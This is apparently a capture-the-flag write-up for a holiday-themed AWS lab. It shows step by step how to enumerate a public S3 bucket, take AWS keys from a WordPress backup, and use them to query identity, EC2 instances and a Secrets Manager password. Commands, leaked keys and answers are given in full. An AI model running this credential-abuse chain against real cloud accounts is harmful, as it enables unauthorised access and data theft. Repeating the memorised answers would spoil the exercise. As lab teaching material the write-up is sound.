# Concept
* AWS Security Testing
# Method of solve
## Q1 - What is the name of the S3 Bucket used to host the HR Website announcement?
* the image with the HR announcement indicates the s3 bucket associated with it:
```
https://s3.amazonaws.com/images.bestfestivalcompany.com/flyer.png
```
* this lets us know that the bucket name is `images.bestfestivalcompany.com`
## Q2 - What is the message left in the flag.txt object from that bucket?
* we can use the following `aws-cli` command to check if the s3 bucket has open permissions
```
aws s3 ls s3://images.bestfestivalcompany.com/ --recursive --no-sign-request
```
* then we can download the `flag.txt` file
```
aws s3 cp s3://images.bestfestivalcompany.com/flag.txt . --no-sign-request
```
* the answer is `It's easy to get your elves data when you leave it so easy to find!`
## Q3 - What other file in that bucket looks interesting to you?
* we're looking for the `wp-backup.zip` file, which might contain sensitive data
## Q4 - What is the AWS Access Key ID in that file?
* download backup file, then unzip it and search for the Access key, which typically starts with the string `AKIA`
```
aws s3 cp s3://images.bestfestivalcompany.com/wp-backup.zip . --no-sign-request
unzip wp-backup.zip
grep wp_backup/ -r -e "AKIA"
```
* the answer is `AKIAQI52OJVCPZXFYAOI`
## Q5 - What is the AWS Account ID that access-key works for?
* the `wp-config.php` file where we found the Access key has a lot of information for the S3 bucket config:
```
define('S3_UPLOADS_BUCKET', 'images.bestfestivalcompany.com');
define('S3_UPLOADS_KEY', 'AKIAQI52OJVCPZXFYAOI');
define('S3_UPLOADS_SECRET', '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');
define('S3_UPLOADS_REGION', 'us-east-1');
```
* we can use this information to configure our aws account:
```
aws configure                                                   
AWS Access Key ID [None]: AKIAQI52OJVCPZXFYAOI
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]:
```
* after the config is done, we can use this command to get the account number:
```
aws sts get-access-key-info --access-key-id AKIAQI52OJVCPZXFYAOI
```
* the answer is `019181489476`
## Q6 - What is the Username for that access-key?
* we have to do some further configuration before we can get the username:
```
aws configure --profile PROFILENAME
AWS Access Key ID [None]: AKIAQI52OJVCPZXFYAOI
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]:
```
* then we can run this command to get the account details:
```
aws sts get-caller-identity --profile PROFILENAME
```
* the answer is `ElfMcHR@bfc.com`
## Q7 - There is an EC2 Instance in this account. Under the TAGs, what is the Name of the instance?
* we can use the following command to get detailed information about the ec2 instances associated with this account:
```
aws ec2 describe-instances --output text --profile PROFILENAME
```
* the answer is `HR-Portal`
## Q6 - What is the database password stored in Secrets Manager?
* we can use the following command to return all the secrets stored in the aws secretsmanager:
```
aws secretsmanager list-secrets --region us-east-1
```
* this lets us know that there is a secret called `HR-Password`
* now we can use this command to get the specific password:
```
aws secretsmanager get-secret-value --secret-id HR-Password
```
* apparently we are accessing the wrong `region` with our request, and since we're dealing with Santa, we'll try the `north` region
```
aws secretsmanager get-secret-value --secret-id HR-Password --region eu-north-1
```
* the answer is `Winter2021!`
